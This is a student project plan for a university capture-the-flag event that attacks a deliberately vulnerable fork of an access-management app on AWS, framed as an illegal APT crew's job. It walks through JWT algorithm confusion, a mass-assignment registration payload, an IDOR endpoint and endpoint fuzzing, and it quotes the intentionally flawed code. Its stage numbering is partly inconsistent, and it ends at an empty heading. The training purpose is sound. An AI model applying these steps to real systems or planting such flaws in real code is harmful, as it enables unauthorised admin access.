# SecureGate CTF — Project Plan

> [!danger] Revision Notice
> This document has been rewritten in place to reflect three major changes from the original design:
> 1. **Narrative** — the pentest-contract framing is gone. Players are now members of an illegal APT collective (Section 2).
> 2. **Team** — this is a 2-person project (Thebe: infra/PAM/backend; OSINT partner: lore + full OSINT chain), not 3 (Section 4).
> 3. **Attack chain** — players are no longer handed working PAM credentials. Account access is now itself part of the attack (Section 5, Stage 0 is new). This required a corresponding identity/scoring redesign (new Section 18A).
>
> Sections on AWS infra, Security Groups, EC2 reference, and the deployed-vulnerability code/bug log (§23.1–23.3) are still accurate and unchanged. Everything else has been edited in place — there is no separate "v2" file. This is the only plan document going forward.

> [!abstract] What Is This Event?
> SecureGate CTF is a **Capture The Flag competition** built on top of the SecureGate PAM infrastructure. A specially deployed, **intentionally vulnerable** fork of the PAM system is hosted on AWS and handed to ~20–24 classmates as a black-box target. Players — in-character as members of an illegal APT collective — must work through escalating stages of reconnaissance, self-registration, web exploitation, privilege escalation, and database flag retrieval, using real-world attack techniques against real running infrastructure. Every technical stage is paired with a chained OSINT thread that players must follow to progress past the points where guessing alone won't work.
>
> **Real vulnerabilities. Real AWS infrastructure. Real flags. No simulation.**

---

## Table of Contents

- [[#1. The Big Picture]]
- [[#2. What Makes This a Real CTF]]
- [[#3. AWS Infrastructure — Full Architecture]]
- [[#4. Team Structure & Domain Ownership]] — **rewritten: 2-person team**
- [[#5. The Challenge Stages (Stage 0 is new — Stage numbering is now 0–3, not 1–4)]] — **rewritten: Stage 0 added, Stages 2–3 merged/renumbered**
- [[#6. Repository & Directory Layout]]
- [[#7. The Technology Stack]]
- [[#8. Project Phases — Overview]]
- [[#9. Phase 0 — AWS Bootstrap & Network Design (Day 1, All Members)]]
- [[#10. Phase 1 — CTF PAM Fork & Vulnerability Injection (Member 2)]]
- [[#11. Phase 2 — Flag Database & MySQL EC2 (Member 3)]]
- [[#12. Phase 3 — Lore Page, Leaderboard & Nginx EC2 (Member 1)]]
- [[#13. Phase 4 — Onboarding Pipeline & Participant Accounts (Member 2)]] — **rewritten: crew accounts, not PAM credentials**
- [[#14. Phase 5 — Hardening, Isolation & Security Groups (Member 3)]]
- [[#15. Phase 6 — Integration Testing & Attack Walkthroughs (All)]]
- [[#16. Full Attack Chain — Step by Step]]
- [[#17. Vulnerability Design Explained]]
- [[#17A. OSINT Chain Design]] — **new**
- [[#18. Leaderboard & Scoring System]]
- [[#18A. Identity Architecture & Discord/Scoreboard Attribution]] — **new**
- [[#19. EC2 Instance Reference]]
- [[#20. Security Boundaries — What Is Intentional vs What Must Be Protected]]
- [[#21. Event Day Operations]]
- [[#22. Timeline & Task Breakdown]] — **rewritten: 2-person breakdown**

---

## 1. The Big Picture

### What Problem Are We Solving?

University CTFs are typically toy environments — a Docker container on a laptop, a pre-built challenge image with an obvious hint, flags hidden behind puzzles that look nothing like real attacks. Students solve them and learn abstract techniques that feel disconnected from actual professional security work.

SecureGate CTF solves this by using the **real PAM system** we built as the attack surface. Players face:

- A real Next.js application running on a real EC2 instance
- A real JWT authentication system that has a real cryptographic vulnerability
- A real RBAC system with a real broken access control flaw
- A real MySQL database on a separate EC2 instance holding the flag

The attack techniques — certificate transparency recon, HTTP header disclosure, JWT algorithm confusion, IDOR, mass assignment, and privilege escalation — are all documented in real CVEs, real bug bounty reports, and real penetration testing frameworks. A student who solves this CTF has practiced the same class of attacks that professional red teamers run on enterprise systems every week.

### The Core Concept

```
WITHOUT SecureGate CTF:
  Student → solves contrived puzzle → gets flag → learns trick
  Student leaves with nothing that transfers to professional work

WITH SecureGate CTF:
  Player → recons a live web application → finds a JWT vulnerability
         → forges admin token → exploits broken access control
         → retrieves database flag → leaves knowing how PAM systems fail
```

### Why Four Stages?

Each stage filters players by skill and teaches a distinct lesson:

| Stage | Name | Skill Tested | Real-World Equivalent |
|---|---|---|---|
| 0 | Foothold | Endpoint fuzzing, self-registration | Finding an exposed signup/admin endpoint |
| 1 | Recon | OSINT, HTTP analysis | Bug bounty recon phase |
| 2 | Web Exploitation | JWT attacks, mass assignment, or IDOR (chained with OSINT) | Enterprise SSO bypass |
| 3 | Privilege Escalation | Broken access control | Lateral movement in web apps |
| 4 | Flag Retrieval | DB access via PAM session | Data exfiltration through a proxy |

> [!warning] Stage 0 is new and changes everything downstream
> The original design had players start with working credentials handed to them by email, making Stage 0 unnecessary. That handout has been removed (see Section 2). Players now start with **nothing but the lore site link** and must self-register a PAM account before anything else is possible. See Section 5 for the full rewritten chain.

The stages are **sequential in effect**, not strictly enforced by a gate at every step — a player who forges an ADMIN JWT via Stage 2A can skip Stage 3's registration step entirely and go straight to Stage 4. This is intentional: multiple valid paths exist and are documented per-path in Section 5.

---

## 2. What Makes This a Real CTF

### The Lore (rewritten — black-hat framing, not pentest-contract)

Players do not receive a plain challenge description. They receive a **scenario**, delivered entirely in-fiction:

> Players are members of an illegal APT collective (crew name TBD — see Section 8 open items). A senior member of the crew, handle **`thebe562`**, has already run recon against TASMOC and defaced their public-facing site as a calling card. But the crew hit a wall: TASMOC's internal Privileged Access Management portal, **SecureGate**, stands between the crew and the real prize — the `secret_ops` MySQL database. `thebe562` can't get past PAM alone and is pulling the rest of the crew in to finish the job.

There is no "terms of engagement" document, no pentest contract framing, and no suggestion that players are authorized to be doing any of this — that's the point. The out-of-scope rules (Section 20) are delivered as an in-character OPSEC warning from the handler, not a legal document.

### Delivery Sequence (as built)

1. Player receives **one link**: the TASMOC public site — styled as a corporate pharma decoy, served from the lore/Nginx EC2.
2. Player scrolls to the footer. Page freezes → 2s pause → glitch flicker (`GlitchFlicker.tsx`) → terminal overlay (`TerminalOverlay.tsx`) opens with typewriter dialogue from `thebe562` explaining the crew, the target, and the PAM wall.
3. Player clicks **Acknowledge** → routed to sign-in for their **crew account** (this is a `lore_players` login — see Section 18A — not a PAM/SecureGate account; those are unrelated systems).
4. Signed-in dashboard shows three tabs: **Lore**, **Hints/Intel** (new — see Section 17A), and **Scoreboard/Submit**.
5. The Lore tab, read to the end, ends with the `pam-ctf.duckdns.org` link and a short in-character nudge — "this is the wall, find a way in."
6. From this point on, the player has **zero PAM-side knowledge** beyond the conceptual explanation of what a PAM is, given narratively by `thebe562` in the terminal dialogue. No login. No hints about endpoints. That's the actual game — see Stage 0 in Section 5.

### What Players Are Given

At the start of the event, every player receives exactly:

- Their **crew (lore-site) account** — created via the Google Form onboarding pipeline, see Section 13
- The single TASMOC/lore site URL
- A Discord server invite for announcements (see Section 18A for what is and isn't tied to player identity there)

**Nothing PAM-related is handed out.** No SecureGate URL beyond what's inside the lore page itself, no PAM credentials, no hints about endpoints. The lore-to-PAM handoff (step 5 above) is the only bridge, and it hands over a URL, not access.

### What Players Must Figure Out

Everything else is discovered through the attack chain (Section 5) and its paired OSINT threads (Section 17A):

- That `POST /api/register` exists at all, and how to reach it (Stage 0)
- That a JWKS endpoint exists at `/.well-known/jwks.json` (standard JWT discovery)
- That the server leaks its framework version in HTTP headers
- That the registration endpoint accepts a `clearanceCode` field, and what values it maps to what role (requires the OSINT-planted provisioning runbook — no longer discoverable by guessing "role" as a field name, since the field was deliberately renamed)
- That the audit log endpoint lacks per-user filtering enforcement in one specific query path, and that exploiting it usefully requires a UUID fragment planted across the OSINT chain
- The structure of the flag table in the MySQL database

---

## 3. AWS Infrastructure — Full Architecture

### Overview

The CTF runs on **four EC2 instances** in the same AWS VPC. Three are purpose-built for the CTF. The fourth is the existing SecureGate production PAM instance — it is completely isolated from all CTF infrastructure and must never be touched during the event.

```
┌─────────────────────────────────────────────────────────────────────┐
│                          AWS VPC (us-east-1)                        │
│                                                                     │
│  ┌─────────────────┐     ┌─────────────────┐                       │
│  │  CTF-PAM EC2    │     │  CTF-MySQL EC2  │                       │
│  │  (t2.micro)     │────►│  (t2.micro)     │                       │
│  │  Public IP      │     │  Private IP     │                       │
│  │  Port 80/443    │     │  Port 22 only   │                       │
│  │  Port 3000      │     │  (from CTF-PAM) │                       │
│  └─────────────────┘     └─────────────────┘                       │
│           │                                                         │
│  ┌─────────────────┐     ┌─────────────────────────────────────┐  │
│  │  Lore-Nginx EC2 │     │  SecureGate Production PAM EC2      │  │
│  │  (t2.micro)     │     │  (EXISTING — DO NOT TOUCH)          │  │
│  │  Public IP      │     │  Completely separate Security Group  │  │
│  │  Port 80 only   │     │  No peering with CTF instances      │  │
│  └─────────────────┘     └─────────────────────────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### EC2 Instance Definitions

#### Instance 1 — CTF-PAM EC2

This is the primary attack surface. Players interact with this machine exclusively through their browser.

| Property | Value |
|---|---|
| **Instance type** | t2.micro (1 vCPU, 1 GB RAM) |
| **AMI** | Ubuntu 22.04 LTS |
| **Region** | us-east-1 |
| **Public IP** | Dynamic (updated by DuckDNS cron job on boot) |
| **DuckDNS subdomain** | `ctf-pam.duckdns.org` |
| **Elastic IP** | Not allocated — DuckDNS compensates |
| **Inbound rules** | Port 22 (SSH, team IPs only), Port 80 (0.0.0.0/0), Port 443 (0.0.0.0/0) |
| **Outbound rules** | All traffic (needed to reach CTF-MySQL on private IP) |
| **Storage** | 20 GB gp3 EBS |
| **Software** | Docker, Docker Compose, Nginx (host-installed), Certbot, Node.js 20 |

What runs on it:
- The vulnerable SecureGate PAM fork (Docker Compose: app + postgres + redis + mongo)
- Nginx reverse proxy (port 80/443 → localhost:3000)
- DuckDNS update cron job

#### Instance 2 — CTF-MySQL EC2

This holds the flag. Players never interact with it directly — they reach it only through a PAM session after completing Stages 1–3. It has no public IP.

| Property | Value |
|---|---|
| **Instance type** | t2.micro (1 vCPU, 1 GB RAM) |
| **AMI** | Ubuntu 22.04 LTS |
| **Region** | us-east-1 |
| **Public IP** | None — private VPC IP only |
| **Private IP** | Static, assigned at launch (e.g. `10.0.1.50`) |
| **Inbound rules** | Port 22 (SSH, from CTF-PAM private IP only), Port 3306 (MySQL, from CTF-PAM private IP only) |
| **Outbound rules** | None (fully locked) |
| **Storage** | 8 GB gp3 EBS |
| **Software** | MySQL 8.0, OpenSSH, pamuser account |

What runs on it:
- MySQL 8.0 with the flag database
- A `pamuser` account (the SSH user the CTF PAM authenticates as)
- Decoy tables and fake employee data around the real flag

#### Instance 3 — Lore-Nginx EC2

A static web server serving the CTF narrative. Players visit this first to get context and the starting URL. It deliberately leaks one piece of information in its HTTP headers (a specific custom header) that gives players the first foothold for Stage 1.

| Property | Value |
|---|---|
| **Instance type** | t2.micro (1 vCPU, 1 GB RAM) |
| **AMI** | Ubuntu 22.04 LTS |
| **Region** | us-east-1 |
| **Public IP** | Dynamic (DuckDNS) |
| **DuckDNS subdomain** | `apt-lore.duckdns.org` |
| **Inbound rules** | Port 22 (SSH, team IPs only), Port 80 (0.0.0.0/0) |
| **Outbound rules** | All traffic |
| **Storage** | 8 GB gp3 EBS |
| **Software** | Nginx (host-installed), static HTML/CSS |

#### Instance 4 — Production SecureGate PAM EC2 (Existing)

This is the existing demo PAM at `securepamgate.duckdns.org`. It is listed here only to make the isolation requirement explicit.

> [!danger] HARD RULE — Zero Contact
> The CTF infrastructure has **zero network path to the Production EC2**. They are in separate Security Groups with no cross-group rules. No shared secrets. No shared databases. If the CTF PAM is compromised by a player going beyond the intended attack chain, it cannot pivot to the Production EC2 under any circumstances.

### VPC & Subnet Design

```
VPC: 10.0.0.0/16

Public Subnet:  10.0.0.0/24
  ├── CTF-PAM EC2       (gets public IP via Internet Gateway)
  └── Lore-Nginx EC2    (gets public IP via Internet Gateway)

Private Subnet: 10.0.1.0/24
  └── CTF-MySQL EC2     (no public IP, no Internet Gateway route)

Internet Gateway: attached to VPC, routes traffic for Public Subnet only
NAT Gateway: NOT required (private subnet instances need no outbound internet)
```

### Security Group Rules (Complete)

#### SG-CTF-PAM

| Direction | Protocol | Port | Source/Destination | Reason |
|---|---|---|---|---|
| Inbound | TCP | 22 | Team static IPs only | SSH management |
| Inbound | TCP | 80 | 0.0.0.0/0 | HTTP (players) |
| Inbound | TCP | 443 | 0.0.0.0/0 | HTTPS (players) |
| Outbound | TCP | 22 | SG-CTF-MySQL | PAM→MySQL SSH tunnel |
| Outbound | TCP | 3306 | SG-CTF-MySQL | PAM→MySQL direct (optional) |
| Outbound | All | All | 0.0.0.0/0 | Internet for package installs |

#### SG-CTF-MySQL

| Direction | Protocol | Port | Source/Destination | Reason |
|---|---|---|---|---|
| Inbound | TCP | 22 | SG-CTF-PAM | PAM tunnels in via SSH |
| Inbound | TCP | 3306 | SG-CTF-PAM | Direct MySQL (if needed) |
| Outbound | None | None | — | Fully locked — no egress |

#### SG-Lore-Nginx

| Direction | Protocol | Port | Source/Destination | Reason |
|---|---|---|---|---|
| Inbound | TCP | 22 | Team static IPs only | SSH management |
| Inbound | TCP | 80 | 0.0.0.0/0 | HTTP (players) |
| Outbound | All | All | 0.0.0.0/0 | Package installs only |

### DuckDNS Cron Job (Both Public EC2s)

Both CTF-PAM and Lore-Nginx run this cron job to keep their DuckDNS records current if the instance restarts:

```bash
# /etc/cron.d/duckdns  — runs every 5 minutes
*/5 * * * * root curl -s "https://www.duckdns.org/update?domains=<subdomain>&token=<token>&ip=" > /var/log/duckdns.log 2>&1
```

A systemd service variant that also runs on boot:

```bash
# /etc/systemd/system/duckdns.service
[Unit]
Description=DuckDNS IP Update
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/duckdns-update.sh

[Install]
WantedBy=multi-user.target
```

### AWS Cost Estimate (Before November)

With $100 in credits and a target end date in November, the budget is generous. Approximate monthly costs for four t2.micro instances in us-east-1:

| Resource | Monthly Cost (approx) |
|---|---|
| 3× t2.micro EC2 (CTF instances) | ~$10.50 |
| 1× t2.micro EC2 (existing Production) | ~$3.50 |
| EBS storage (4 volumes ~50 GB total) | ~$4.00 |
| Data transfer out (light CTF traffic) | ~$1.00 |
| **Total / month** | **~$19.00** |

At $19/month, $100 in credits covers roughly **5 months** (June → October), well within the November target. Keep instances running continuously — stopping and starting them wastes time and changes public IPs. The DuckDNS cron handles IP changes on restarts but it is always better to keep them live.

---

## 4. Team Structure & Domain Ownership

> [!warning] This is now a 2-person project
> The original 3-member domain split (lore/UX, PAM/vuln-eng, MySQL/infra) no longer reflects reality. All infra, PAM vulnerability engineering, MySQL/vault work, scoring backend, and Discord alerting is done by **Thebe**. All narrative, lore-site content, the Hints/Intel tab, and the full OSINT document chain is owned by the **OSINT partner**. Any references elsewhere in this document to "Member 1/2/3" should be read as this 2-person split — they are not corrected line-by-line everywhere, but the mapping is: old Member 2 + Member 3 responsibilities → Thebe; old Member 1 responsibilities → OSINT partner.

### The Two Domains

```
┌───────────────────────────────────────────────────┬───────────────────────────────────┐
│                    THEBE                           │           OSINT PARTNER            │
│         Infra, PAM, Backend, Scoring                │      Narrative & OSINT Chain       │
├───────────────────────────────────────────────────┼───────────────────────────────────┤
│  CTF-PAM EC2 (app + MySQL EC2 + all AWS infra)      │  Lore-Nginx EC2 (or lore repo)      │
│  /ctf-pam/ repo — vulnerable fork                   │  /ctf-lore/ repo                    │
│                                                     │                                     │
│  • Vulnerable PAM fork (all injected vulns)         │  • TASMOC decoy site + defacement   │
│  • JWKS endpoint, algorithm confusion               │    glitch/terminal overlay sequence │
│  • Mass assignment (clearanceCode)                  │  • Crew narrative & thebe562 voice  │
│  • IDOR endpoint                                    │  • Dashboard: Lore / Hints / Score  │
│  • lore_players auth table + isolated JWT signing   │    tabs (frontend + content)        │
│  • Flag DB, MySQL EC2, pamuser account, decoys      │  • Hints/Intel tab breadcrumbs       │
│  • Security groups, hardening, snapshots            │  • Full OSINT document chain: the   │
│  • Discord webhook wiring (alerts + solves)         │    provisioning runbook, the leak   │
│  • Scoreboard/submit API                            │    page, fragment placement, any    │
│  • Google Form → bulk crew-account creation script  │    supporting "leaked" documents    │
└───────────────────────────────────────────────────┴───────────────────────────────────┘
```

### Interaction Points

There are two places where the domains meet, both narrower than before since there's no MySQL-EC2/PAM split anymore:

**Point A — Thebe → OSINT partner: Final URLs**
Once the CTF-PAM EC2 and DuckDNS subdomain are stable, Thebe hands the OSINT partner the final `pam-ctf.duckdns.org` link to embed at the end of the Lore tab (Section 2, delivery step 5) — this is the only PAM-side detail that reaches the lore site directly, and it's a bare URL, not credentials or hints.

**Point B — Thebe ↔ OSINT partner: Ground-Truth Values for OSINT Content**
Any OSINT-planted document that reveals a real system value (the `clearanceCode → role` mapping, the admin UUID fragments) must match what's actually deployed. Thebe supplies the ground-truth values (see Section 17A tables); the OSINT partner builds the planted documents around them. Mismatches here are the single biggest risk to the OSINT chain actually working — keep a shared internal doc (`ctf-ops/docs/attack-walkthrough.md`) as the source of truth both people check against before finalizing content.

---

## 5. The Challenge Stages (Stage 0 is new — Stage numbering is now 0–3, not 1–4)

### Stage 0 — Foothold (new stage — replaces the old credential handout)

**What players must find:** Any working PAM account at all. At the start, players have none.

**Why this exists:** The original design handed every player a working OPERATOR email/password before the event even started. That skipped both recon (nothing to find, the URL and credentials just arrive) and the mass-assignment vulnerability (no reason to ever discover `/api/register` if you already have an account). Removing the handout turns account creation itself into the first real challenge.

**How it works:**

`pam-ctf.duckdns.org` shows only a login page. There is no register link anywhere in the frontend. `POST /api/register` exists (`app/api/register/route.ts`) but is completely unlinked — reachable only via directory/endpoint fuzzing (`ffuf`, `gobuster`, or a wordlist that includes common API paths like `register`).

The endpoint accepts `{ email, password, clearanceCode }`. If `clearanceCode` is missing or not recognized, the account **silently falls back to OPERATOR** — this is intentional (see `lib/register/route.ts` logic) and gives a player who finds the endpoint but hasn't done any OSINT yet a real, working account and a natural stopping point before the harder puzzle (Stage 3B) kicks in.

> [!important] Required change from the original seed data
> In the original `docker/postgres/seed.sql`, OPERATOR has an `access_policies` row for the MySQL asset (1800s sessions). **This must be removed.** With it in place, a blind self-registered OPERATOR could request a MySQL session immediately and skip every subsequent stage. After removal, OPERATOR should have no path to a session at all — verify this against a live `/api/assets` call for a freshly self-registered OPERATOR account before the event, don't assume the seed change alone is sufficient.

**What players learn:** unauthenticated/unlinked endpoints are a real and common attack surface; endpoint fuzzing is often the actual first step in a real engagement, not header-reading alone.

---

### Stage 1 — Recon

**What players must find:** The target application's technology stack and a hidden endpoint path.

**Vulnerability class:** Information disclosure via HTTP response headers and certificate transparency logs.

**How it works:**

The CTF PAM is configured to leak two pieces of information:

1. **HTTP `X-Powered-By` header** — The Nginx configuration deliberately does NOT strip the `X-Powered-By: Next.js` header that Node.js adds. Players who inspect the response headers with `curl -I` or browser dev tools see the framework immediately.

2. **`Server` header** — Nginx is configured to reveal `nginx/1.24.0` rather than suppressing the version. This is a deliberate disclosure; in real hardening you would suppress this.

3. **Certificate Transparency (CT) logs** — Even though HTTPS is configured via Let's Encrypt, CT logs are public. Players who search `crt.sh` for `duckdns.org` certificates will find `ctf-pam.duckdns.org` listed, confirming the target domain and the certificate authority used. This teaches players that CT logs are a real recon resource, not a CTF-specific trick.

**The flag for Stage 1:** There is no traditional flag for Stage 1. Completing Stage 1 means the player has enough information to attempt Stage 2. The "proof of Stage 1 completion" is the act of using the discovered endpoint in Stage 2. This mirrors real penetration testing: recon does not produce a deliverable, it enables the next action.

**What players learn:** HTTP headers leak framework and server information; CT logs reveal infrastructure even before you visit it; manual header inspection is a fundamental skill.

---

### Stage 2 — Web Exploitation

**What players must find:** A valid JWT access token with the `ADMIN` role.

**Two independent attack paths reach this — no OSINT required for Path A, OSINT required for Path B. IDOR is a side-track that pays off inside Path B's OSINT chain, not a third path to ADMIN on its own.**

#### Path A — JWT Algorithm Confusion (RS256 → HS256) — no hints, rewards prior knowledge

**What the vulnerability is:**

The CTF PAM uses RS256 JWT tokens. The public key is available at `/.well-known/jwks.json` (this endpoint exists in the real SecureGate code and is intentionally left open). In a correctly implemented RS256 system, the server only accepts tokens signed with the private key, verified with the public key.

The vulnerability: the CTF PAM's `verifyAccessToken` function is modified to accept **both RS256 and HS256** without explicitly rejecting the algorithm field in the token header.

```
Normal RS256 flow:
  Client gets token signed with PRIVATE KEY
  Server verifies with PUBLIC KEY
  Attacker has no private key → cannot forge

Algorithm confusion attack:
  Attacker takes the PUBLIC KEY (freely available at /jwks.json)
  Attacker signs a new token with HS256, using the PUBLIC KEY as the HMAC secret
  Vulnerable server accepts HS256 tokens → tries to verify with "the key"
  The "key" it has is the public key → same bytes the attacker used
  Verification passes → forged admin token accepted
```

**The injected vulnerability (modification to `lib/auth.ts`):**

The original `verifyAccessToken` in the real SecureGate uses `importSPKI` and explicitly passes `"RS256"` to `jwtVerify`. The CTF version replaces this with a version that passes the raw key bytes and allows the algorithm to be taken from the token header — making it susceptible to algorithm confusion.

**Player steps:**

1. Have any valid RS256 token — even the OPERATOR account self-registered in Stage 0 works fine, it doesn't need to be ADMIN
2. Decode the token with `jwt.io` or Python → see the payload: `{ role: "OPERATOR", ... }`
3. Visit `/.well-known/jwks.json` → extract the RSA public key
4. Convert the public key to PEM format
5. Craft a new JWT with `{ alg: "HS256" }` in the header and `{ role: "ADMIN", ... }` in the payload
6. Sign it using the RSA public key bytes as the HMAC-SHA256 secret
7. Send API requests with the forged token → server accepts it → ADMIN access granted

Tools players can use: `python-jwt`, `PyJWT`, `jwt_tool`, or any JWT library. Note: newer `pyjwt` refuses to sign with a PEM-shaped key as an HMAC secret even when passed as raw bytes — see §23.2, bug #9 for the hand-rolled JWT construction workaround used during internal testing, useful if players hit the same wall.

**Design note — intentionally hintless.** No OSINT breadcrumb exists for this path (see Section 17A). It's meant to reward players who already recognize "JWKS endpoint exposed + server might accept alg confusion" as a known anti-pattern. If a hint is ever added, it must be a mundane implementation detail (e.g. a fake engineering-blog mention of "supporting both RS256 and HS256 during a migration"), never a security warning.

#### Path B — Mass Assignment via Registration, Chained with OSINT

**What the vulnerability is:**

`POST /api/register` (discovered in Stage 0) accepts `{ email, password, clearanceCode }`. Unlike the original design, the field is **not** called `role` and does not accept role names directly — it accepts an opaque `clearanceCode` string, mapped server-side:

```javascript
// app/api/register/route.ts — as actually deployed
const CLEARANCE_MAP: Record<string, string> = {
  "PROV-STANDARD": "OPERATOR",
  "PROV-AUDIT":    "AUDITOR",
  "PROV-ROOT":     "ADMIN",
};
const finalRole = CLEARANCE_MAP[clearanceCode] ?? "OPERATOR"; // unknown/missing → OPERATOR (Stage 0)
```

This is deliberate: a player cannot get to ADMIN by guessing `{"role": "ADMIN"}` the way the original plan assumed. They need the actual code value, `PROV-ROOT`, and that only exists in a planted OSINT document (the "TASMOC provisioning runbook" — see Section 17A). Finding the endpoint (Stage 0) and finding the mapping (OSINT) are two separate, independently-gated achievements.

**Player steps:**

1. Already have `/api/register` from Stage 0
2. Follow the OSINT chain (Section 17A) to the provisioning runbook, which reveals `PROV-ROOT → ADMIN`
3. Register again (or for the first time) with `{ "email": "attacker@evil.com", "password": "p@ssw0rd", "clearanceCode": "PROV-ROOT" }`
4. Log in with the new credentials → receive a **real, legitimately-signed** ADMIN JWT (no forgery needed — this path and Path A both arrive at ADMIN, by different means)
5. Call `GET /api/assets` → see the `Corp MySQL Server` asset
6. Call `POST /api/sessions/request` with the MySQL asset ID → receive a JIT ticket
7. Open the terminal at `/terminal?ticket=<uuid>` → SSH tunnel established to CTF-MySQL EC2

**What players learn:** mass assignment is OWASP API Top 10 territory; never trust client-supplied privilege fields even when they're renamed/obfuscated; obfuscating a field name doesn't fix the underlying trust bug, it just adds an OSINT/investigation layer on top — which is exactly what this stage demonstrates.

#### Side-track — IDOR on Audit Log Endpoint (partial credit, not a bottleneck)

**What the vulnerability is:**

The real SecureGate audit sessions endpoint correctly filters by `userId` for OPERATOR role:

```javascript
const filter = auth.role === "OPERATOR" ? { userId: auth.userId } : {};
```

The CTF version adds a second endpoint, `/api/audit/sessions/user/[uid]`, where `uid` from the URL is used directly without verifying it belongs to the caller. Any authenticated player (even a blind Stage-0 OPERATOR) can substitute another user's UUID and pull their session list.

**This grants zero privilege by itself** — it's a read-only leak. It only pays off if the player has a UUID worth trying, which means it's gated entirely behind the OSINT chain's planted UUID fragments (Section 17A), not behind any technical difficulty. Award partial points for a successful IDOR call; don't require it to progress.

**What players learn:** IDOR is OWASP API Top 10 territory; authentication passing doesn't mean authorization is correctly scoped; object-level authorization has to be checked explicitly on every route, not assumed from the auth middleware alone.

---

### Stage 3 — Flag Retrieval

**What players must find:** The flag string inside the MySQL database.

**How it works:**

Once inside the terminal (via Stage 3), players land in a MySQL shell (the PAM auto-logs into MySQL as it does in the real system). They see multiple databases and tables. The flag is in one specific table amid convincing decoy data:

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| employees          |
| hr_archive         |
| financial_records  |
| secret_ops         |
+--------------------+

mysql> use secret_ops;
mysql> show tables;
+----------------------+
| Tables_in_secret_ops |
+----------------------+
| project_codenames    |
| access_tokens        |
| flag                 |  ← this one
+----------------------+

mysql> select * from flag;
+----+------------------------------------------+
| id | value                                    |
+----+------------------------------------------+
|  1 | CTF{jwt_alg_confusion_pam_pwned_2025}    |
+----+------------------------------------------+
```

The flag format: `CTF{<descriptive_string>}`. The string describes the primary vulnerability used, so even the flag itself is educational.

**Decoy tables** in `employees` and `hr_archive` contain realistic fake data (generated names, salary figures, fake SSNs) to make players work to find the right database rather than immediately landing on the flag.

**Flag submission:** Players submit the flag string through the Scoreboard/Submit tab in their crew dashboard (Section 2, delivery step 4) — not a standalone public page. Submission is tied to their logged-in crew (`lore_players`) session, not a free-text email field — see Section 18A for why this matters and what changed.

**What players learn:** Database enumeration; how a PAM system that is compromised still exposes the underlying data; why defence in depth (encrypting data at rest, column-level encryption) matters even when the PAM layer is breached.

---

## 6. Repository & Directory Layout

Two separate repositories. The CTF infrastructure is **never** mixed with the production SecureGate repository.

### Repository 1 — `ctf-pam` (Member 2 owns, all members can read)

This is the intentionally vulnerable fork of SecureGate. It is a **private GitHub repository** — never made public, not even after the event, because it contains live AWS credential-adjacent configuration and intentional vulnerabilities that should not be shared freely.

```
/ctf-pam                              ← Root of the vulnerable PAM fork
│
├── server.ts                         ← Same as production (no changes needed)
│
├── /app
│   ├── /api
│   │   ├── /auth
│   │   │   ├── login/route.ts        ← MODIFIED: logs failed attempts to MongoDB
│   │   │   └── refresh/route.ts      ← unchanged
│   │   ├── /register
│   │   │   └── route.ts              ← NEW: unauthenticated registration (VULNERABLE)
│   │   ├── /assets
│   │   │   └── route.ts              ← unchanged
│   │   ├── /sessions
│   │   │   ├── request/route.ts      ← unchanged
│   │   │   └── [id]/route.ts         ← unchanged
│   │   ├── /audit
│   │   │   ├── sessions/route.ts     ← unchanged
│   │   │   ├── sessions/[id]/events  ← unchanged
│   │   │   └── sessions/user/[uid]   ← NEW: IDOR endpoint (VULNERABLE)
│   │   ├── /.well-known
│   │   │   └── jwks.json/route.ts    ← NEW: exposes RSA public key (intentional)
│   │   └── /ctf
│   │       └── submit/route.ts       ← NEW: flag submission handler
│   │
│   ├── /login                        ← unchanged
│   ├── /dashboard                    ← unchanged
│   ├── /terminal                     ← unchanged
│   └── /replay                       ← unchanged
│
├── /lib
│   ├── auth.ts                       ← MODIFIED: algorithm confusion vulnerability injected
│   ├── rbac.ts                       ← unchanged
│   ├── db.ts                         ← unchanged
│   ├── redis.ts                      ← unchanged
│   ├── mongo.ts                      ← unchanged
│   ├── audit.service.ts              ← unchanged
│   └── /vault
│       ├── vault.service.ts          ← unchanged
│       └── tunnel.service.ts         ← MODIFIED: connects to CTF-MySQL EC2 private IP
│
├── /docker
│   ├── /postgres
│   │   ├── init.sql                  ← unchanged
│   │   └── seed.sql                  ← MODIFIED: CTF participant accounts seeded here
│   └── seed-vault.ts                 ← MODIFIED: CTF-MySQL EC2 SSH creds
│
├── docker-compose.yml                ← unchanged (same four services)
├── .env                              ← MODIFIED: CTF-MySQL private IP as target host
├── next.config.ts                    ← MODIFIED: no allowedDevOrigins, add header config
└── README.md                         ← CTF operator notes only (not public)
```

### Repository 2 — `ctf-lore` (Member 1 owns, all members can read)

Static HTML/CSS site served by Nginx on the Lore EC2. No build process — pure static files deployed by `rsync` or `scp`.

```
/ctf-lore                             ← Root of the lore site
│
├── /public
│   ├── index.html                    ← Lore landing page (APT Solutions narrative)
│   ├── engagement.html               ← Fake "terms of engagement" document
│   ├── leaderboard.html              ← Live leaderboard (polls /api/scores)
│   ├── submit.html                   ← Flag submission form
│   └── /assets
│       ├── style.css                 ← Dark terminal aesthetic CSS
│       ├── logo.svg                  ← APT Solutions fake company logo
│       └── leaderboard.js            ← Polls score API every 10 seconds
│
├── /nginx
│   └── apt-lore.conf                 ← Nginx config for this site
│       │                                Includes the deliberate header leak:
│       │                                add_header X-Challenge-Platform "SecureGate-PAM";
│       └── (this header is Stage 1's starting breadcrumb)
│
└── deploy.sh                         ← rsync to Lore EC2 over SSH
```

### Repository 3 — `ctf-ops` (All members, private)

Operational scripts used during setup and the event itself. Not deployed anywhere — lives on team members' machines.

```
/ctf-ops                              ← Operator tooling
│
├── /onboarding
│   ├── participants.csv              ← Name, email, assigned credentials
│   ├── bulk-create-users.ts          ← Calls CTF PAM API to create accounts
│   ├── email-template.html           ← Themed credential delivery email
│   └── send-emails.ts               ← Sends credential emails via SMTP
│
├── /monitoring
│   ├── check-health.sh               ← Curls all three EC2s and reports status
│   ├── tail-logs.sh                  ← SSH into CTF-PAM and tails Docker logs
│   └── redis-monitor.sh              ← Watches Redis for active sessions during event
│
├── /nuclear
│   ├── reset-ctf.sh                  ← Full reset: wipe all sessions + scores
│   ├── ban-ip.sh                     ← Add IP to Nginx deny list (for abuse)
│   └── extend-session-ttl.sh        ← For debugging — manually extend a session
│
└── /docs
    ├── attack-walkthrough.md         ← Complete solution (team eyes only)
    └── infrastructure-notes.md      ← IP addresses, passwords, key paths
```

---

## 7. The Technology Stack

